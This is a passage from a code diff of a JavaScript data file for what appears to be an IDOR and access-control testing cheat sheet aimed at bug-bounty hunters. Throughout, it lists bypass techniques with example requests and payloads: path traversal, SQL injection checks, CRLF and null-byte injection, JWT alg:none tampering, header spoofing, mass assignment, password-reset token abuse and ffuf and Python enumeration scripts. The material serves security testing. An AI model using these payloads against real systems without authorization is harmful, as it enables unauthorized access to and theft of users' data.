-        desc: "Double slashes or dot segments can confuse path normalization, routing around auth middleware.",
-        code: `GET /api/v5/users//9\nGET /api/v5/users/./9\nGET /api/v5/users/%2F9\nGET /api//v5//users//9` },
-      { title: "Case variation / key swapping", risk: "medium", riskLabel: "Medium",
-        desc: "Case-sensitive routing can bypass case-insensitive auth checks. Also swap parameter names (user_id ↔ userid ↔ uid).",
-        code: `# Case variation\nGET /api/User?id=123\nGET /api/USER?id=123\n\n# Param name swapping\n?user_id=9  →  ?userid=9\n?uid=9      →  ?account_id=9` },
-      { title: "Path traversal in ID position", risk: "high", riskLabel: "High",
-        desc: "Use ../ to escape your authorized resource scope and reach a victim's resource.",
-        code: `POST /users/delete/10/../9\nPOST /files/10/../../9/secret\nGET  /data/my_id/../../victim_id` },
-      { title: "Wildcard substitution", risk: "low", riskLabel: "Low",
-        desc: "Replace ID with wildcard characters to see if the server returns all records.",
-        code: `GET /api/users/*\nGET /api/users/_\nGET /api/users/%\nGET /api/users/null\nGET /api/users/undefined` },
-      { title: "Fuzz keywords in path", risk: "medium", riskLabel: "Medium",
-        desc: "Replace numeric ID with keywords — some endpoints have undocumented mass-access routes.",
-        code: `GET /api/v3/users/12345\n  → /api/v3/users/all\n  → /api/v3/users/list\n  → /api/v3/users/export\n  → /api/v3/users/admin` },
-      { title: "SQLi quick check", risk: "medium", riskLabel: "Medium",
-        desc: "Append a single quote to the ID — if the app is vulnerable to SQLi, it may return errors or all records.",
-        code: `GET /api/v3/users/12345'\nGET /api/v3/users/12345 OR 1=1--\nGET /api/v3/users/12345' UNION SELECT *--` },
-    ]
-  },
-  {
-    id: 4, label: "Logic Bypass", fullLabel: "Logic & Endpoint Bypasses",
-    tag: "Bypass", tagClass: "tag-bypass",
-    info: "Target application logic flaws — where authorization checks exist but can be sidestepped through version differences, token swaps, or frontend/backend desync.",
-    techniques: [
-      { title: "API version downgrading", risk: "high", riskLabel: "High",
-        desc: "Older API versions often have weaker or missing auth checks. Downgrade from v3 to v1.",
-        code: `GET /v3/user/111   # secured\n         ↓\nGET /v1/user/111   # older, weaker\nGET /v2/user/111   # middle version` },
-      { title: "Sub-endpoint variant", risk: "high", riskLabel: "High",
-        desc: "Full-profile endpoints may be protected, but detail sub-endpoints may not be independently authorized.",
-        code: `GET /api/user/9           # protected\n\n# Try sub-endpoints:\nGET /api/user/9/email\nGET /api/user/9/phone\nGET /api/user/9/address` },
-      { title: "Missing function-level access control", risk: "high", riskLabel: "High",
-        desc: "Frontend hides admin routes — but backend may accept them. Try accessing admin endpoints with a normal user token.",
-        code: `# Admin endpoints accessible to normal users:\nGET /admin/users\nGET /Admin/users       # case bypass\nGET /ADMIN/users\nGET /manage/users\nGET /internal/users` },
-      { title: "Owner flag / role field toggle", risk: "critical", riskLabel: "Critical",
-        desc: "Look for is_admin, owner, role fields in API responses. Try sending those fields in your request to escalate privileges.",
-        code: `# Server response contains:\n{"user_id":10, "is_admin": false}\n\n# Attack: send is_admin=true in body\nPUT /api/profile\nBody: {"is_admin": true, "role": "admin"}` },
-      { title: "Token / authorization swap", risk: "critical", riskLabel: "Critical",
-        desc: "Swap your Bearer token with the victim's token, or test if an API key from one account authorizes actions on another.",
-        code: `# Test: use attacker's token on victim's resource\nAuthorization: Bearer <attacker_token>\nGET /api/user/9   # victim's ID\n\n# If data returns → token not bound to resource` },
-      { title: "Token binding flaw", risk: "critical", riskLabel: "Critical",
-        desc: "Tokens validated for structure/expiry but not bound to a specific resource. Reuse a valid token issued for resource A against resource B.",
-        code: `# Token issued for page_id=A\nPOST /unsubscribe?token=<valid_for_A>&page_id=B\n\n# If unsubscribes page B → token binding flaw!\n# Common in email links, action tokens` },
-      { title: "Frontend–backend desync", risk: "critical", riskLabel: "Critical",
-        desc: "UI hides certain IDs, but backend accepts them without ownership verification. Send hidden IDs via proxy.",
-        code: `# UI shows only your tasks\n# Intercept and modify in Burp:\nPOST /deleteTask\nBody: {"taskId": 11}  # another user's task\n\n# If deleted → backend lacks owner check` },
-      { title: "Cached role / session race", risk: "medium", riskLabel: "Medium",
-        desc: "Auth caches can be stale. Logout and re-login after changing roles, then re-test to find false negatives.",
-        code: `1. Login as admin\n2. Downgrade to normal user\n3. Immediately test admin endpoints\n   → cached role may still apply\n4. Also try concurrent requests` },
-    ]
-  },
-  {
-    id: 5, label: "Param Abuse", fullLabel: "Parameter & Body Abuse",
-    tag: "Attack", tagClass: "tag-attack",
-    info: "Manipulate request parameters and body structures to confuse backend parsing logic.",
-    techniques: [
-      { title: "Add parameter bypass", risk: "high", riskLabel: "High",
-        desc: "Append a user_id parameter to endpoints that don't normally take one — backend may use it to override context.",
-        code: `GET /api/messages\n     ↓\nGET /api/messages?user_id=9\nGET /api/messages?account_id=9\nGET /api/messages?uid=9` },
-      { title: "HTTP Parameter Pollution (HPP)", risk: "high", riskLabel: "High",
-        desc: "Send the same parameter twice. Different servers/frameworks handle duplicates differently — first, last, or both values may be used.",
-        code: `?user_id=10&user_id=9\n\n# PHP: uses last → user_id=9\n# Java: uses first → user_id=10\n# Node: array → [10, 9]` },
-      { title: "JSON array / object wrap", risk: "medium", riskLabel: "Medium",
-        desc: "Wrap the ID value in an array or nested object — parsers may extract differently than expected.",
-        code: `# Array wrap\n{"userid": [9]}\n\n# Nested object\n{"userid": {"userid": 9}}\n\n# JSON param pollution\n{"userid": 10, "userid": 9}` },
-      { title: "Multi-ID / comma separation", risk: "high", riskLabel: "High",
-        desc: "Send multiple IDs in one request — if the server processes all of them, victim data leaks alongside attacker data.",
-        code: `GET /api/users?id=10,9\nGET /api/users?id=10&id=9\n{"ids": [10, 9, 11, 12]}` },
-      { title: "Null termination (%00)", risk: "medium", riskLabel: "Medium",
-        desc: "A null byte may truncate ID matching in some backends, causing them to match a different resource.",
-        code: `GET /api/users/9%00\nGET /api/users/9%00.jpg\n# Body:\n{"user_id": "9\\u0000"}` },
-      { title: "Replace parameter name", risk: "medium", riskLabel: "Medium",
-        desc: "Swap one resource parameter for another — album_id for account_id — to test cross-resource access.",
-        code: `# Original\nGET /api/photos?album_id=10\n\n# Try:\nGET /api/photos?account_id=9\nGET /api/photos?user_id=9\nGET /api/photos?owner_id=9` },
-      { title: "Deserialization / object injection", risk: "critical", riskLabel: "Critical",
-        desc: "Send an object in place of a primitive ID. Servers that blindly deserialize may map to different objects or honor extra fields like role.",
-        code: `# Instead of: user_id=9\n# Send object:\n{"user": {"id": 9, "role": "admin"}}\n\n# Protobuf injection:\n# Replace user_id field with crafted message\n# containing victim ID + elevated role` },
-      { title: "Alternate separators", risk: "low", riskLabel: "Low",
-        desc: "Use non-standard separators in place of commas to confuse parsers.",
-        code: `{"account": "2222;1111"}\n{"account": "2222.1111"}\n{"account": "2222|1111"}\n{"account": "2222 1111"}` },
-    ]
-  },
-  {
-    id: 6, label: "Encoding", fullLabel: "Encoding & Obfuscation",
-    tag: "Bypass", tagClass: "tag-bypass",
-    info: "Encode or obfuscate IDs to bypass validation patterns that check raw values.",
-    techniques: [
-      { title: "Leading zeros", risk: "low", riskLabel: "Low",
-        desc: "Some systems treat '009' as different from '9' at the routing layer but resolve to the same record in the DB.",
-        code: `GET /api/users/9\n  → GET /api/users/09\n  → GET /api/users/009\n  → GET /api/users/0009` },
-      { title: "%20 / whitespace bypass", risk: "low", riskLabel: "Low",
-        desc: "URL-encoded spaces can confuse some regex-based ID validators.",
-        code: `GET /api/users/9%20\nGET /api/users/%209\nGET /api/users/9+0` },
-      { title: "Type confusion (string vs integer)", risk: "medium", riskLabel: "Medium",
-        desc: "Send ID as string when integer expected, or vice versa. Type coercion bugs in some languages can cause mismatches.",
-        code: `# Integer expected, send string:\nGET /api/users/"9"\nGET /api/users/'9'\n{"user_id": "9"}  vs  {"user_id": 9}` },
-      { title: "Base64 decode → modify → re-encode", risk: "high", riskLabel: "High",
-        desc: "Base64-encoded IDs are not encrypted — decode them, change the inner value, re-encode and send.",
-        code: `# Original: MTIzNg==\nbase64_decode("MTIzNg==") → "1236"\n# Modify:\n"1235" → base64_encode → "MTIzNQ=="\n# Send modified value` },
-      { title: "Hex / MD5 / SHA pattern detection", risk: "medium", riskLabel: "Medium",
-        desc: "Identify hash patterns (32-char hex = MD5, 40-char = SHA1). Try crafting known hashes or partial replacements.",
-        code: `# MD5 pattern (32 hex chars):\n5d41402abc4b2a76b9719d911017c592\n# → try: md5("victim@email.com")\n\n# Hex ID:\n0x7B → 123 decimal\n# try: 0x7A (122), 0x7C (124)` },
-      { title: "Unicode / double encoding", risk: "medium", riskLabel: "Medium", isNew: true,
-        desc: "Double URL-encode special chars or use Unicode representations to bypass WAF/auth middleware that decodes only once.",
-        code: `# Double encode:\n/api/users/%252F9     (/ → %2F → %252F)\n/api/users/%2509      (TAB)\n\n# Unicode:\n/api/users/９          (fullwidth 9)` },
-    ]
-  },
-  {
-    id: 7, label: "Protocol", fullLabel: "Protocol & Format Changes",
-    tag: "Bypass", tagClass: "tag-bypass",
-    info: "Switch HTTP methods, content types, or entire protocols — auth checks are often tied to a specific method or format.",
-    techniques: [
-      { title: "Change HTTP method", risk: "high", riskLabel: "High",
-        desc: "Auth middleware often checks methods separately. A protected GET may have an unprotected POST equivalent.",
-        code: `GET  /users/delete/9  → POST /users/delete/9\nDEL  /api/user/9       → GET  /api/user/9\nPOST /get_receipt      → GET  /get_receipt` },
-      { title: "X-HTTP-Method-Override", risk: "high", riskLabel: "High",
-        desc: "Send a POST request with this header to simulate DELETE/PUT — useful when firewalls block those methods.",
-        code: `POST /api/user/9\nX-HTTP-Method-Override: DELETE\n\nPOST /api/user/9\n_method=DELETE     # form-based override` },
-      { title: "Change file type extension", risk: "medium", riskLabel: "Medium",
-        desc: "Some access controls are tied to file extensions. Switch .json to .xml or .txt.",
-        code: `GET /user_data/2341.json\n  → /user_data/2341.xml\n  → /user_data/2341.txt\n  → /user_data/2341.csv\n  → /user_data/2341` },
-      { title: "Change Content-Type", risk: "medium", riskLabel: "Medium",
-        desc: "Switch content type between JSON and form-encoded. Auth may only validate JSON requests properly.",
-        code: `# Original:\nContent-Type: application/json\n{"user_id": 9}\n\n# Switch to:\nContent-Type: application/x-www-form-urlencoded\nuser_id=9\n\n# Or:\nContent-Type: application/xml\n<user_id>9</user_id>` },
-      { title: "gRPC / protobuf endpoint IDOR", risk: "high", riskLabel: "High",
-        desc: "gRPC services often lack the same auth as REST APIs. Test with grpcurl or proxy protobuf traffic.",
-        code: `# grpcurl test:\ngrpcurl -d '{"user_id": 9}' \\\n  target.com:443 \\\n  UserService/GetUser\n\n# Proxy protobuf in Burp:\n# Use Protobuf Decoder extension` },
-      { title: "WebSocket channel IDOR", risk: "high", riskLabel: "High", isNew: true,
-        desc: "Real-time WebSocket/SSE channels named by user ID are often subscribed to without server-side authorization checks.",
-        code: `# Connect to WebSocket\nws = new WebSocket("wss://target.com/ws")\n\n# Subscribe to victim's channel:\nws.send(JSON.stringify({\n  "action": "subscribe",\n  "channel": "user_9"  # victim's ID\n}))` },
-    ]
-  },
-  {
-    id: 8, label: "Payloads", fullLabel: "Injection Bypass Payloads",
-    tag: "Attack", tagClass: "tag-attack",
-    info: "Quick-reference payload table for encoding and injection bypasses. Use these to confuse server-side ID parsing.",
-    isTable: true,
-    payloads: [
-      { variant: "%0d%0a", desc: "CRLF injection in ID", example: '{"id": "2222%0d%0a1111"}' },
-      { variant: "%0a", desc: "Line feed only", example: '{"id": "2222%0a1111"}' },
-      { variant: "%0d", desc: "Carriage return only", example: '{"id": "2222%0d1111"}' },
-      { variant: "%00", desc: "Null byte terminator", example: '{"id": "2222%001111"}' },
-      { variant: ";", desc: "Semicolon separator", example: '{"id": "2222;1111"}' },
-      { variant: ",", desc: "Comma separator", example: '{"id": "2222,1111"}' },
-      { variant: "|", desc: "Pipe char", example: '{"id": "2222|1111"}' },
-      { variant: "&", desc: "Ampersand (HPP)", example: 'id=2222&id=1111' },
-      { variant: "#", desc: "Fragment / comment", example: '{"id": "2222#1111"}' },
-      { variant: "%0a%0dcc:", desc: "Header injection", example: '{"id": "2222%0a%0dcc:1111"}' },
-      { variant: "[]", desc: "Array wrap", example: '{"id": [2222, 1111]}' },
-      { variant: "{}", desc: "Object wrap", example: '{"id": {"id": 1111}}' },
-      { variant: "e+notation", desc: "Float notation", example: '{"id": 9e0}  // = 9' },
-      { variant: "Unicode", desc: "Fullwidth digits", example: '/api/users/９  (U+FF19)' },
-    ]
-  },
-  {
-    id: 9, label: "Advanced", fullLabel: "Advanced Techniques",
-    tag: "Advanced", tagClass: "tag-advanced",
-    info: "Higher complexity techniques requiring more setup — but often yield the most impactful findings.",
-    techniques: [
-      { title: "X-Forwarded-For / IP-based bypass", risk: "medium", riskLabel: "Medium",
-        desc: "Some APIs restrict access by IP. Spoof trusted internal IPs via proxy headers.",
-        code: `X-Forwarded-For: 127.0.0.1\nX-Real-IP: 10.0.0.1\nX-Originating-IP: 192.168.1.1\nX-Remote-IP: 172.16.0.1` },
-      { title: "X-Original-URL header bypass", risk: "medium", riskLabel: "Medium",
-        desc: "Some reverse proxies honor X-Original-URL or X-Rewrite-URL to override the request path.",
-        code: `GET /api/public\nX-Original-URL: /api/admin/users\n\n# Also try:\nX-Rewrite-URL: /api/admin/users` },
-      { title: "Blind IDOR monitoring", risk: "high", riskLabel: "High",
-        desc: "IDOR that doesn't return visible data — instead triggers backend actions. Monitor attacker's email/inbox for victim data.",
-        code: `# Request that sends email to another user:\nPOST /api/export?user_id=9\n# → victim receives export request notification?\n# → Or attacker receives victim's export?` },
-      { title: "GraphQL IDOR", risk: "critical", riskLabel: "Critical",
-        desc: "GraphQL resolvers often lack fine-grained auth. Substitute IDs in queries and mutations.",
-        code: `# Query another user:\nquery { user(id: 9) { email password } }\n\n# Mutation on victim's data:\nmutation { deletePost(id: 999) }\n\n# Introspection to find types:\n{ __schema { types { name } } }` },
-      { title: "TOCTOU / race condition IDOR", risk: "high", riskLabel: "High",
-        desc: "Race condition between auth check and action. Send concurrent requests — one valid, one invalid — to exploit brief authorization gaps.",
-        code: `# Turbo Intruder (Burp):\n# Send 50 concurrent requests:\nfor i in range(50):\n    engine.queue(target.req, str(victim_id))\n\n# Or: last-write-wins race` },
-      { title: "Weak UUID / partial brute force", risk: "medium", riskLabel: "Medium",
-        desc: "If UUIDs share a common prefix or suffix pattern, brute force the variable segment.",
-        code: `# Observed UUIDs:\nusr-2024-00001a\nusr-2024-000021\n# Pattern: usr-2024-XXXXXX\n# Brute: ffuf -w hex4.txt \\\n#   -u /api/user/usr-2024-FUZZ` },
-      { title: "SSRF-chained IDOR", risk: "high", riskLabel: "High", isNew: true,
-        desc: "Combine SSRF with IDOR — use a URL parameter that fetches internal resources to access objects behind auth.",
-        code: `# SSRF endpoint that fetches data:\nPOST /api/webhook\n{"url": "http://internal/api/user/9"}\n\n# Chains with IDOR to reach\n# internal-only resources` },
-      { title: "Mass assignment IDOR", risk: "critical", riskLabel: "Critical", isNew: true,
-        desc: "Frameworks that auto-bind request fields to model properties. Send extra fields like user_id, owner_id in create/update requests.",
-        code: `# Create a resource, add owner_id:\nPOST /api/orders\n{\n  "item": "laptop",\n  "user_id": 9,      # set victim as owner\n  "account_id": 9\n}` },
-    ]
-  },
-  {
-    id: 10, label: "Automation", fullLabel: "Enumeration & Automation",
-    tag: "Automation", tagClass: "tag-automation",
-    info: "Tools and recipes for automating IDOR discovery at scale.",
-    isTools: true,
-    tools: [
-      { name: "ffuf", desc: "Fast web fuzzer — enumerate sequential IDs or UUIDs at speed.", cmd: "ffuf -u https://target/api/user/FUZZ \\\n  -w ids.txt \\\n  -H \"Authorization: Bearer TOKEN\" \\\n  -fc 403,404 -mc 200 \\\n  -o results.json" },
-      { name: "Turbo Intruder", desc: "Burp Suite plugin for high-speed intruder attacks — ideal for race conditions and large ID ranges.", cmd: "# In Burp: right-click request\n# Extensions → Turbo Intruder\n# Select race_single_packet_attack.py\n# Set numeric range in script" },
-      { name: "Arjun", desc: "HTTP parameter discovery tool — finds hidden query/body params that accept IDs.", cmd: "arjun -u https://target/api/messages\n# Finds hidden params like:\n# ?user_id= ?account= ?uid=" },
-      { name: "ParamMiner", desc: "Burp extension — mines hidden parameters from responses and JS files.", cmd: "# Burp → Extensions → ParamMiner\n# Right-click → Guess params\n# Checks headers, body, query" },
-      { name: "grpcurl", desc: "Command-line tool for testing gRPC services — equivalent to curl for gRPC.", cmd: "grpcurl -plaintext \\\n  -d '{\"user_id\": 9}' \\\n  target.com:9090 \\\n  user.UserService/GetUser" },
-      { name: "jwt_tool", desc: "Test JWT token manipulation — modify sub/user_id claims without valid signature.", cmd: "python3 jwt_tool.py TOKEN \\\n  -T              # tamper mode\n  -pc user_id     # payload claim\n  -pv 9           # victim's ID value\n  -X a            # alg:none attack" },
-    ]
-  },
-  {
-    id: 11, label: "False Negatives", fullLabel: "Detecting False Negatives",
-    tag: "Recon", tagClass: "tag-recon",
-    info: "IDOR checks can return false negatives — appearing blocked when they aren't. Use this checklist to ensure thorough coverage.",
-    isChecklist: true,
-    items: [
-      "Compare response body and content-length, not just HTTP status code — 200 with empty body vs 200 with data.",
-      "Retry after logout/login cycle to bust server-side role/session cache.",
-      "Test every endpoint with multiple HTTP methods (GET, POST, PUT, DELETE, PATCH).",
-      "Test via web browser AND mobile app AND direct API calls — different codepaths.",
-      "Check if role restrictions are frontend-only by bypassing UI via proxy (Burp).",
-      "Test batch endpoints and multi-ID arrays — victim ID may leak among valid IDs.",
-      "Include WebSocket, gRPC, and SSE channels in your test scope.",
-      "Test unauthenticated requests — sometimes auth is completely missing.",
-      "Check error messages — 500 errors on victim IDs vs 404 on random IDs reveals existence.",
-      "Test both v1 and v2+ API endpoints for the same resource.",
-    ]
-  },
-  {
-    id: 12, label: "Priority", fullLabel: "Quick Prioritization Guide",
-    tag: "Recon", tagClass: "tag-recon",
-    info: "Order your testing by business impact — focus on highest-value targets first to maximize bounty potential.",
-    isPriority: true,
-    items: [
-      { rank: "1", label: "Exposed PII / financial endpoints", detail: "SSNs, credit cards, bank accounts, payment history, invoices" },
-      { rank: "2", label: "Export / download / file endpoints", detail: "Bulk data exports, file downloads, backup access" },
-      { rank: "3", label: "Write / modify operations", detail: "PUT, PATCH, DELETE — can cause data loss or hijacking" },
-      { rank: "4", label: "Batch / multi-ID endpoints", detail: "High surface area, potential for mass data enumeration" },
-      { rank: "5", label: "GraphQL / mobile APIs / gRPC / WebSocket", detail: "Often less tested, weaker auth implementation" },
-      { rank: "6", label: "Predictable ID patterns / weak UUIDs", detail: "Integer sequences, timestamps, MD5 hashes" },
-    ]
-  }
+const phases=[
+{id:1,label:"IDOR Types",fullLabel:"IDOR Vulnerability Types",tag:"Recon",tc:"tag-recon",
+info:"Understanding all 6 IDOR types is essential before testing. Each type has different detection techniques and severity scoring.",
+isTypes:true,
+types:[
+  {title:"Horizontal IDOR",color:"#6c63ff",desc:"Same privilege level, different user. User A accesses resources belonging to User B. Most common type — no privilege escalation needed.",
+   code:`GET /api/invoices/INV-10022  # victim's invoice\nAuthorization: Bearer <attacker_token>\n# Returns victim's data → HORIZONTAL IDOR\n# CVSS: 6.5 (read) to 8.8 (write/delete)`},
+  {title:"Vertical IDOR",color:"#ff6584",desc:"Standard user accesses admin/privileged resources by guessing/knowing the identifier of a higher-privilege object.",
+   code:`GET /api/reports/REPORT-ADMIN-001\nAuthorization: Bearer <standard_user_token>\n# Should be 403 — if 200 → VERTICAL IDOR\n# CVSS: 7.5–9.1`},
+  {title:"Blind IDOR",color:"#f9c74f",desc:"Action succeeds on another user's resource but no data is returned. Often missed because 204 No Content looks like success.",
+   code:`DELETE /api/comments/COMMENT-5521\nAuthorization: Bearer <attacker_token>\nHTTP/1.1 204 No Content  ← victim's comment deleted\n# No data returned but action succeeded!`},
+  {title:"Second-Order IDOR",color:"#43e97b",desc:"Identifier stored in one workflow step, reused in a later step without re-validating ownership. Hardest to detect.",
+   code:`# Step 1 (User A creates): POST /api/requests → REQUEST-001\n# Step 3 (User B resumes): POST /api/requests/resume\n# Body: {"request_id": "REQUEST-001"}  ← User A's resource\n# Backend skips re-validation → SECOND-ORDER IDOR`},
+  {title:"Multi-Tenant IDOR",color:"#4cc9f0",desc:"Cross-organization access in SaaS apps. One tenant accesses another tenant's data. Force multiplier — exposes entire org.",
+   code:`GET /api/v1/customers?org_id=tenant_bbb\nAuthorization: Bearer <tenant_aaa_user_token>\n# Returns ALL of tenant_bbb's customers!\n# CVSS: 8.8–9.5 (always Critical)`},
+  {title:"Mass Assignment IDOR",color:"#f72585",desc:"Framework auto-binds request fields to model properties. Attacker sends user_id, owner_id, role in the request body.",
+   code:`PUT /api/profile\n{"name":"Attacker","user_id":9,"role":"admin","org_id":"target"}\n# Framework updates ALL fields including privileged ones\n# CVSS: 8.8–9.1`},
+]},
+
+{id:2,label:"Setup",fullLabel:"Setup & Recon",tag:"Recon",tc:"tag-recon",
+info:"Proper lab setup is the foundation of thorough IDOR testing. Never skip these steps — missing setup causes missed vulnerabilities.",
+techniques:[
+  {title:"Create attacker + victim accounts",risk:"critical",rl:"Critical",
+   desc:"Create at minimum two accounts: Attacker (your controlled account) and Victim. For multi-tenant apps, place them in different organizations. Document every resource ID owned by each account before testing.",
+   code:`test_accounts = {\n  "attacker": { "id": 10, "email": "attk@test.local" },\n  "victim":   { "id": 9,  "email": "vic@test.local" },\n  # Multi-tenant:\n  "tenant_a": { "org": "org-aaa", "token": None },\n  "tenant_b": { "org": "org-bbb", "token": None },\n}`,
+   tip:"<b>Pro tip:</b> Also create an admin account if possible — needed for vertical IDOR testing."},
+  {title:"Map owned resource IDs per account",risk:"high",rl:"High",
+   desc:"Before testing, document exactly which resource IDs belong to each account. This is what proves IDOR — you need to know that doc-101 belongs to victim, not attacker.",
+   code:`victim_resources = {\n  "documents":  ["doc-101","doc-102","doc-103"],\n  "invoices":   ["inv-101","inv-102"],\n  "orders":     ["ord-991","ord-992"],\n  "messages":   ["msg-881","msg-882"],\n  "files":      ["file-441","file-442"],\n}`},
+  {title:"Enumerate all API endpoints",risk:"high",rl:"High",
+   desc:"Collect endpoints from OpenAPI/Swagger specs, JS bundle analysis, mobile app decompilation, Burp Site Map, and network traffic. Documented APIs are only part of the surface.",
+   code:`# Sources:\ncurl /swagger.json\ncurl /api-docs\ncurl /openapi.yaml\n# JS analysis:\ngrep -r 'fetch\\|axios\\|api/' *.js\n# Mobile:\njadx app.apk && grep -r 'api' output/`,
+   tip:"<b>Pro tip:</b> JS bundles often contain internal API routes the Swagger spec omits."},
+  {title:"Configure Burp Autorize",risk:"medium",rl:"Medium",
+   desc:"Install Autorize extension in Burp Suite. Add victim's session token. As you browse as attacker, Autorize auto-replays every request with victim token and flags similar responses (potential IDOR).",
+   code:`# Autorize color codes:\nRed    = similar response → potential IDOR\nGreen  = different response → likely protected\nYellow = borderline → manual review needed\n\n# Limitation: only catches what you browse!`},
+  {title:"Find leaked IDs from all sources",risk:"high",rl:"High",
+   desc:"IDs leak from many unexpected places. Check all of them before testing — you can't test what you can't reference.",
+   code:`# Check all these sources for victim IDs:\n- Referrer headers in HTTP traffic\n- Email receipts & notifications\n- Swagger/OpenAPI spec examples\n- Public profile pages: /u/{username}\n- Error messages mentioning other IDs\n- API responses: {"created_by": 9}\n- JavaScript source files\n- URL fragments in shared links`,
+   tip:"<b>Pro tip:</b> Create a public post/listing as victim and note any IDs exposed in the response."},
+  {title:"Identify all ID parameter locations",risk:"medium",rl:"Medium",
+   desc:"ID parameters appear in 6 different locations. Each must be tested independently — protection in one doesn't guarantee protection in others.",
+   code:`# All locations to check:\n1. URL path:    GET /api/orders/ORDER-001\n2. Query param: GET /api/orders?id=ORDER-001\n3. JSON body:   {"order_id": "ORDER-001"}\n4. Form field:  order_id=ORDER-001\n5. Cookie:      order_session=ORDER-001\n6. Header:      X-Resource-ID: ORDER-001`},
+  {title:"Extract endpoints from mobile APK",risk:"medium",rl:"Medium",
+   desc:"Mobile apps frequently expose API endpoints not in web UI or docs. Decompile and extract them systematically.",
+   code:`# Decompile:\njadx -d output/ app.apk\napktool d app.apk\n\n# Extract API endpoints:\ngrep -rE 'https?://[^"]+api[^"]+' output/\ngrep -rE '/v[0-9]+/[a-z]+/?' output/\n\n# Strings from binary:\nstrings app.apk | grep '/api/'`,
+   tip:"<b>Pro tip:</b> iOS apps: use frida or objection to intercept calls at runtime."},
+  {title:"Baseline legitimate responses",risk:"low",rl:"Low",
+   desc:"Record the exact response (status, body, content-length) when each account legitimately accesses their own resources. You'll compare against this to confirm IDOR.",
+   code:`# Capture baseline:\n# Attacker's own invoice:\nGET /api/invoices/inv-attacker-001\n# → 200 OK, body: {"user_id":10, ...}\n\n# Now test with victim's invoice ID:\nGET /api/invoices/inv-101  (victim's)\n# Compare response — same structure?\n# Check: is user_id in body still 10 or now 9?`},
+]},
+
+{id:3,label:"Horizontal",fullLabel:"Horizontal IDOR Attacks",tag:"Attack",tc:"tag-attack",
+info:"User A accessing User B's resources at the same privilege level. Always start here. Test every HTTP method — write/delete IDOR scores much higher than read IDOR.",
+techniques:[
+  {title:"Basic ID flip in URL path",risk:"critical",rl:"Critical",
+   desc:"Replace your resource ID with victim's resource ID in the URL. The most fundamental test — always do this first.",
+   code:`GET /api/v5/users/10   # your account (attacker)\n           ↓\nGET /api/v5/users/9    # victim's account\n\n# Test ALL HTTP methods:\nGET    /api/invoices/inv-101  → read IDOR (CVSS ~6.5)\nPUT    /api/invoices/inv-101  → write IDOR (CVSS ~8.8)\nDELETE /api/invoices/inv-101  → delete IDOR (CVSS ~8.8)\nPATCH  /api/invoices/inv-101  → modify IDOR`},
+  {title:"Systematic cross-user resource enumeration",risk:"critical",rl:"Critical",
+   desc:"For every endpoint and every resource type, test victim's IDs with attacker's token. Automate with Python to cover all combinations.",
+   code:`import requests\n\ndef test_idor(base, endpoints, token_a, victim_ids):\n    headers = {"Authorization": f"Bearer {token_a}"}\n    for ep in endpoints:\n        for rid in victim_ids:\n            for method in ["GET","PUT","PATCH","DELETE"]:\n                r = requests.request(\n                    method, f"{base}{ep.format(id=rid)}",\n                    headers=headers)\n                if r.status_code not in [401,403,404]:\n                    print(f"IDOR: {method} {ep} → {r.status_code}")`},
+  {title:"Incremental numeric brute force",risk:"critical",rl:"Critical",
+   desc:"When IDs are sequential integers, enumerate all of them. Even UUID-based apps sometimes use sequential IDs for older endpoints.",
+   code:`# ffuf sequential enumeration:\nffuf -u https://target/api/user/FUZZ \\\n     -w <(seq 1 10000) \\\n     -H "Authorization: Bearer TOKEN" \\\n     -mc 200 -fc 403,404 -o hits.json\n\n# Intruder: Sniper attack\n# Payload type: Numbers\n# From: 1 To: 99999 Step: 1`,
+   tip:"<b>Pro tip:</b> Compare content-length in responses — same length as your own resource = data returned."},
+  {title:"Sub-resource / nested endpoint IDOR",risk:"high",rl:"High",
+   desc:"Even when the parent resource is protected, sub-resources often aren't independently authorized. Test every nested endpoint.",
+   code:`GET /api/user/9           # may be protected\n\n# Test sub-resources independently:\nGET /api/user/9/profile\nGET /api/user/9/email\nGET /api/user/9/phone\nGET /api/user/9/address\nGET /api/user/9/payment-methods\nGET /api/user/9/documents\nGET /api/user/9/activity-log\nGET /api/user/9/sessions`,
+   tip:"<b>Pro tip:</b> Sub-endpoints often have separate middleware that forgets to check ownership."},
+  {title:"Batch endpoint mixed-ID attack",risk:"critical",rl:"Critical",
+   desc:"Batch endpoints that accept arrays of IDs often check authorization once for the collection, not per item. Mix attacker and victim IDs.",
+   code:`# Batch request mixing victim IDs:\nPOST /api/documents/batch-export\n{"ids": [10, 11, 9, 101, 102]}\n#            ↑       ↑    ↑\n#         attacker's  victim's IDs\n# If response includes doc-9/101/102 → IDOR\n\n# Also test:\nGET /api/users?ids[]=10&ids[]=9\nGET /api/users?id=10,9`},
+  {title:"Export & download endpoint IDOR",risk:"critical",rl:"Critical",
+   desc:"Export endpoints are high-value targets. They return bulk data and are often skipped in authorization reviews.",
+   code:`# High-value export IDORs:\nGET  /api/export?user_id=9\nGET  /api/invoices/export?account=9\nPOST /api/reports/generate\n     {"user_id": 9, "format": "csv"}\n\nGET  /api/files/download/FILE-victim-001\nGET  /static/exports/user_9_data.zip\n\n# Async export: trigger export, poll for results\nPOST /api/export/start → {"job_id": "JOB-001"}\nGET  /api/export/JOB-001/download  # test with victim job`,
+   tip:"<b>Pro tip:</b> Export jobs are often created async — test the download endpoint separately."},
+  {title:"Search & filter scope bypass",risk:"high",rl:"High",
+   desc:"Search endpoints that filter by owner_id/user_id may apply the scope AFTER query execution, returning other users' data.",
+   code:`# Inject victim ID as filter:\nGET /api/documents?search=*&owner_id=9\nGET /api/orders?filter[user_id]=9\nGET /api/messages?from_user=9\n\n# Scope override in body:\nPOST /api/search\n{"query":"*","user_id":9,"scope":"all"}`},
+  {title:"Password reset IDOR",risk:"critical",rl:"Critical",
+   desc:"Password reset flows using predictable or leaked tokens can allow resetting another user's password.",
+   code:`# Reset request leaks user ID in response:\nPOST /api/forgot-password\n{"email": "victim@x.com"}\n# Response: {"reset_token": "tok123", "user_id": 9}\n\n# Use token for different user:\nPOST /api/reset-password\n{"token": "tok123", "user_id": 10}  # your ID\n# If accepted → token not bound to user!`,
+   tip:"<b>Pro tip:</b> Also test if reset link contains predictable token that can be derived for other accounts."},
+]},
+
+{id:4,label:"Vertical",fullLabel:"Vertical IDOR & Privilege Escalation",tag:"Attack",tc:"tag-attack",
+info:"Standard user accessing admin/privileged resources. Often higher severity than horizontal IDOR. Combined with admin ID discovery, can be critical.",
+techniques:[
+  {title:"Access admin resource by ID",risk:"critical",rl:"Critical",
+   desc:"If you can obtain an admin resource's ID (from leakage, docs, error messages), test whether a standard user token can access it.",
